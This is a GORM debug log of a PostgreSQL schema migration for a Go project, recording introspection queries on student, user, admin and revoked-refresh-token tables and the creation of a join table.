2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.838ms] [34;1m[rows:-][0m SELECT * FROM "students" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.419ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.194ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.538ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'students'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.504ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.735ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.583ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.326ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.360ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'is_premiem') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.972ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.326ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND constraint_name = 'fk_students_user'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.189ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_students_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.462ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_student_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.977ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.379ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.654ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.566ms] [34;1m[rows:-][0m SELECT * FROM "revoked_refresh_tokens" LIMIT 5

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.124ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_refresh_tokens' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.662ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_refresh_tokens'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.471ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'revoked_refresh_tokens'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.994ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.020ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.182ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.105ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.099ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_tokens' AND column_name = 'refresh_token') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_refresh_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.754ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'revoked_refresh_tokens' AND indexname = 'idx_revoked_refresh_tokens_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.588ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_refresh_token_students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.687ms] [34;1m[rows:0][0m CREATE TABLE "revoked_refresh_token_students" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"student_id" bigint,"revoked_refresh_token_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_revoked_refresh_token_students_student" FOREIGN KEY ("student_id") REFERENCES "students"("id"),CONSTRAINT "fk_revoked_refresh_token_students_revoked_refresh_token" FOREIGN KEY ("revoked_refresh_token_id") REFERENCES "revoked_refresh_tokens"("id"))

2025/06/09 14:07:43 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.120ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_revoked_refresh_token_students_deleted_at" ON "revoked_refresh_token_students" ("deleted_at")

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.732ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.398ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.522ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.648ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.447ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.941ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.578ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.139ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.112ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.074ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.149ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.039ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.258ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.084ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.018ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.031ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.076ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.097ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.057ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.025ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.157ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.738ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.527ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'admins' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.352ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.641ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'admins'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.613ms] [34;1m[rows:-][0m SELECT * FROM "admins" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.680ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'admins' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.551ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'admins'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.595ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'admins'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
